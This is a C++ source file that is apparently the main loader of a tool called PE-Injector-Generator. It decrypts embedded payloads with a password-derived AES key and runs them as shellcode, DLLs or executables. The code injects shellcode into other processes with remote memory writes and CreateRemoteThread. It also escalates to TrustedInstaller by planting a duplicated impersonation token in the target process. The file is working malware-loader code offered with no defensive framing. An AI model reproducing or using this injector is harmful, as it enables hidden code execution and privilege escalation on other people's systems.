// main.cpp — PE-Injector-Generator loader: entry point + job scheduler.

#include "config.h"
#include "jobs.h"
#include "log.hpp"
#include "selfmap.hpp"
#include "dllload.hpp"
#include "proc.hpp"
#include "remotemap.hpp"
#include "codec.hpp"
#include "sha256.hpp"
#include "ti_util.hpp"
#include "stub_sc_data.h"

#include <windows.h>
#include <tlhelp32.h>

#include <cstdlib>
#include <cstring>
#include <cwchar>
#include <vector>

// ---------------------------------------------------------------------------
// injection
// ---------------------------------------------------------------------------

static int run_local_shellcode(const unsigned char *data, unsigned int len, bool ti) {
    void *mem = VirtualAlloc(nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 4;
    memcpy(mem, data, len);
    DWORD old = 0;
    if (!VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old)) return 4;

    if (ti) {
        // TI impersonation is thread-level, so the shellcode must run INLINE on
        // this thread (a new thread would drop the token). Best effort: on
        // failure ti_impersonate() leaves the admin token intact.
        ti_impersonate();
        reinterpret_cast<void (*)()>(mem)();
        RevertToSelf();
    } else {
        HANDLE t = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
        if (!t) return 4;
        WaitForSingleObject(t, INFINITE);
        CloseHandle(t);
    }
    return 0;
}

// ctx layout for stub_sc.c (SetThreadToken + inline shellcode).
struct sc_ctx {
    void *token;
    void *set_token;
    void *shellcode;
};

static int inject_into_pid(DWORD pid, const unsigned char *data, unsigned int len, bool ti) {
    HANDLE hp = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_DUP_HANDLE,
        FALSE, pid);
    if (!hp) return 6;

    // x64 shellcode must land in a 64-bit target; skip 32-bit (WOW64) ones.
    BOOL wow64 = FALSE;
    if (IsWow64Process(hp, &wow64) && wow64) {
        CloseHandle(hp);
        return 3;
    }

    if (ti) {
        // TrustedInstaller: build an impersonation token here and DuplicateHandle
        // it into the target; the stub SetThreadToken's it then runs the shellcode
        // inline on that same thread. Best effort.
        void *token = nullptr;
        void *set_token = nullptr;
        HANDLE primary = nullptr;
        if (TiCreateToken(TI_SESSION_CURRENT, &primary) == ERROR_SUCCESS) {
            HANDLE imp = nullptr;
            if (DuplicateTokenEx(primary, TOKEN_IMPERSONATE | TOKEN_QUERY, nullptr,
                                 SecurityImpersonation, TokenImpersonation, &imp)) {
                HANDLE target_token = nullptr;
                if (DuplicateHandle(GetCurrentProcess(), imp, hp, &target_token,
                                    0, FALSE, DUPLICATE_SAME_ACCESS)) {
                    token = target_token;
                    HMODULE adv = GetModuleHandleA("advapi32.dll");
                    set_token = reinterpret_cast<void *>(GetProcAddress(adv, "SetThreadToken"));
                }
                CloseHandle(imp);
            }
            CloseHandle(primary);
        }
        if (!token || !set_token)
            PIG_LOG(L"inject: TI token setup failed (falling back to admin token)");

        auto *ctx_remote = static_cast<unsigned char *>(
            VirtualAllocEx(hp, nullptr, sizeof(sc_ctx), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        auto *sc_remote = static_cast<unsigned char *>(
            VirtualAllocEx(hp, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        auto *code_remote = static_cast<unsigned char *>(
            VirtualAllocEx(hp, nullptr, stub_sc_code_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        if (!ctx_remote || !sc_remote || !code_remote) { CloseHandle(hp); return 6; }

        SIZE_T written = 0;
        if (!WriteProcessMemory(hp, sc_remote, data, len, &written)) { CloseHandle(hp); return 6; }
        DWORD old_sc = 0;
        if (!VirtualProtectEx(hp, sc_remote, len, PAGE_EXECUTE_READ, &old_sc)) { CloseHandle(hp); return 6; }

        sc_ctx ctx;
        ctx.token = token;
        ctx.set_token = set_token;
        ctx.shellcode = sc_remote;
        if (!WriteProcessMemory(hp, ctx_remote, &ctx, sizeof(ctx), &written)) { CloseHandle(hp); return 6; }

        if (!WriteProcessMemory(hp, code_remote, stub_sc_code, stub_sc_code_len, &written)) { CloseHandle(hp); return 6; }
        DWORD old = 0;
        if (!VirtualProtectEx(hp, code_remote, stub_sc_code_len, PAGE_EXECUTE_READ, &old)) { CloseHandle(hp); return 6; }

        HANDLE t = CreateRemoteThread(hp, nullptr, 0,
                                      reinterpret_cast<LPTHREAD_START_ROUTINE>(code_remote), ctx_remote, 0, nullptr);
        if (!t) { CloseHandle(hp); return 6; }
        CloseHandle(t);
        CloseHandle(hp);
        return 0;
    }

    void *remote = VirtualAllocEx(hp, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(hp); return 6; }
    SIZE_T written2 = 0;
    if (!WriteProcessMemory(hp, remote, data, len, &written2)) { CloseHandle(hp); return 6; }
    DWORD old2 = 0;
    if (!VirtualProtectEx(hp, remote, len, PAGE_EXECUTE_READ, &old2)) { CloseHandle(hp); return 6; }
    HANDLE t2 = CreateRemoteThread(hp, nullptr, 0, (LPTHREAD_START_ROUTINE)remote, nullptr, 0, nullptr);
    if (!t2) { CloseHandle(hp); return 6; }
    CloseHandle(t2);
    CloseHandle(hp);
    return 0;
}

static int run_remote_shellcode(const unsigned char *data, unsigned int len,
                                const wchar_t *target, int wait, bool ti) {
    bool waiting = (wait != 0) || PIG_WAITING;
    DWORD start = GetTickCount();

    for (;;) {
        std::vector<DWORD> pids = find_pids(target);
        if (!pids.empty()) {
            int ok = 0;
            for (DWORD pid : pids) {
                if (inject_into_pid(pid, data, len, ti) == 0)
                    ok++;
                if (PIG_PROCESS_MODE_FIRST)
                    break;

            }
            return ok > 0 ? 0 : 6;
        }
        if (!waiting)
            return 5;
        if (PIG_WAIT_TIMEOUT && (GetTickCount() - start) >= (DWORD)PIG_WAIT_TIMEOUT)
            return 12;
        Sleep((DWORD)PIG_POLL_INTERVAL);
    }
}

// ---------------------------------------------------------------------------
// scheduler
// ---------------------------------------------------------------------------

// Derives the 32-byte AES key from a --password <value> command-line arg.
static bool derive_key(unsigned char key[32]) {
    LPWSTR cmd = GetCommandLineW();
    const wchar_t *needle = L"--password";
    const size_t nlen = wcslen(needle);
    for (LPWSTR p = cmd; *p;) {
        while (*p == L' ' || *p == L'\t') p++;
        if (wcsncmp(p, needle, nlen) == 0 &&
            (p[nlen] == L' ' || p[nlen] == L'\t' || p[nlen] == L'\0' || p[nlen] == L'=')) {
            p += nlen;
            if (*p == L'=') p++;
            while (*p == L' ' || *p == L'\t') p++;
            wchar_t buf[256];
            int i = 0;
            wchar_t quote = 0;
            if (*p == L'"' || *p == L'\'') { quote = *p; p++; }
            while (*p && i < 255 && (quote ? *p != quote : (*p != L' ' && *p != L'\t')))
                buf[i++] = *p++;
            buf[i] = 0;
            char utf8[512];
            int n = WideCharToMultiByte(CP_UTF8, 0, buf, -1, utf8, sizeof(utf8), nullptr, nullptr);
            sha256(reinterpret_cast<const unsigned char *>(utf8), static_cast<size_t>(n - 1), key);
            return true;
        }
        while (*p && *p != L' ' && *p != L'\t') p++;
    }
    return false;
}

static int run_one(const job_t &j, const unsigned char *key) {
    unsigned int raw_len = 0;
    unsigned char *raw = codec_decode(j, key, &raw_len);
    if (!raw)
        return 11;

#if PIG_VERIFY
    // runtime integrity check: digest the decoded payload, compare to the
    // embedded SHA-256. A corrupt payload is skipped, not injected.
    unsigned char digest[32];
    sha256(raw, raw_len, digest);
    char hex[65];
    static const char *hexd = "0123456789abcdef";
    for (int i = 0; i < 32; i++) {
        hex[i * 2] = hexd[digest[i] >> 4];
        hex[i * 2 + 1] = hexd[digest[i] & 0xF];
    }
    hex[64] = 0;
    if (strcmp(hex, j.sha256) != 0) {
        PIG_LOG(L"verify: digest mismatch, skipping job");
        free(raw);
        return 2;
    }
#endif

    int rc;
    switch (j.type) {
    case 0:  // shellcode
        rc = j.target ? run_remote_shellcode(raw, raw_len, j.target, j.wait, j.ti != 0)
                      : run_local_shellcode(raw, raw_len, j.ti != 0);
        break;
    case 1:  // dll
        rc = j.target ? dll_remote_map(raw, raw_len, j.target, j.ti != 0)
                      : dll_load_local(raw, raw_len, j.export_name, j.ti != 0);
        break;
    case 2:  // exe (self-boot)
        rc = selfmap_execute(raw, raw_len, j.args, j.ti != 0);
        break;
    default:
        PIG_LOG(L"job type %d not implemented yet", j.type);
        rc = 1;
    }

    free(raw);
    return rc;
}

static int run() {
    unsigned char key[32];
    bool have_key = derive_key(key);
    int failures = 0;
    for (int i = 0; i < JOB_COUNT; i++) {
        const job_t &j = JOBS[i];
        PIG_LOG(L"job %d: type=%d target=%s", i, j.type, j.target ? j.target : L"(local)");
        int rc = run_one(j, have_key ? key : nullptr);
        PIG_LOG(L"job %d -> %d", i, rc);
        if (rc != 0)
            failures++;
    }
    return failures == 0 ? 0 : 1;
}

#if PIG_CONSOLE
int main() { return run(); }
#else
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) { return run(); }
#endif
